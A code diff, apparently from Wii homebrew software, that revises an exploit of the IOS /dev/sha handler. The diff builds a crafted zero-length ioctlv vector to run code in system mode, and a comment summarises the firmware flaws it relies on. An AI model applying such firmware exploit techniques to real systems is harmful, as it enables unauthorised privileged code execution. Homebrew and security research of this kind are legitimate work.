@@ -1,6 +1,7 @@
 #include "IOSBoot.hpp"
 
 #include <new>
+#include <stdio.h>
 #include <string.h>
 #include <unistd.h>
 #include <ogc/cache.h>
@@ -19,7 +20,11 @@ struct VFile
           m_pos(0)
     {
         ASSERT(len <= TSize);
+        ASSERT(len >= 0x34);
+        ASSERT(!memcmp(data, "\x7F" "ELF", 4));
         memcpy(m_data, data, len);
+        m_data[7] = 0x61;
+        m_data[8] = 1;
         DCFlushRange(reinterpret_cast<void*>(this), 32 + len);
     }
 
@@ -36,7 +41,8 @@ struct VFile
  * 
  * Exploit summary:
  * - IOS does not check validation of vectors with length 0.
- * - All memory regions mapped as readable are executable.
+ * - All memory regions mapped as readable are executable (ARMv5 has no
+ *   'no execute' flag).
  * - NULL/0 points to the beginning of MEM1.
  * - The /dev/sha resource manager, part of IOSC, runs in system mode.
  * - It's obvious basically none of the code was audited at all.
@@ -52,7 +58,7 @@ struct VFile
  */
 s32 IOSBoot::Entry(u32 entrypoint)
 {
-    IOS::ResourceCtrl<s32> sha("/dev/sha");
+    IOS::ResourceCtrl<u32> sha("/dev/sha");
     if (sha.fd() < 0)
         return sha.fd();
     
@@ -66,18 +72,18 @@ s32 IOSBoot::Entry(u32 entrypoint)
     mem1[4] = 0x10100000; // temporary stack
     mem1[5] = entrypoint;
     mem1[6] = 0xFFFF0014; // reserved handler
-    DCFlushRange(MEM1_BASE, 32);
     
-    IOS::Vector vec[3];
-    vec[0].data = NULL;
-    vec[0].len = 0;
-    vec[1].data = reinterpret_cast<void*>(0xFFFE0028);
-    vec[1].len = 0;
-    vec[2].data = NULL;
-    vec[2].len = 0;
+    IOS::IOVector<1, 2> vec;
+    vec.in[0].data = NULL;
+    vec.in[0].len = 0;
+    vec.in[1].data = reinterpret_cast<void*>(0xFFFE0028);
+    vec.in[1].len = 0;
+    /* Unused vector utilized for cache safety */
+    vec.out[0].data = MEM1_BASE;
+    vec.out[0].len = 32;
 
     irse::Log(LogS::Core, LogL::INFO, "Exploit: Doing exploit call");
-    return sha.ioctlv(0, 1, 2, vec);
+    return sha.ioctlv(0, vec);
 }
 
 extern u8 es_bin[];
@@ -98,8 +104,7 @@ s32 IOSBoot::Log::Callback(s32 result, [[maybe_unused]] void* usrdata)
         irse::Log(LogS::Core, LogL::ERROR, "/dev/stdout error: %d", result);
         return 0;
     }
-    LogL level = static_cast<LogL>(result);
-    irse::Log(LogS::IOS, level, "%s", obj->logBuffer);
+    puts(obj->logBuffer);
     obj->restartEvent();
     return 0;
 }
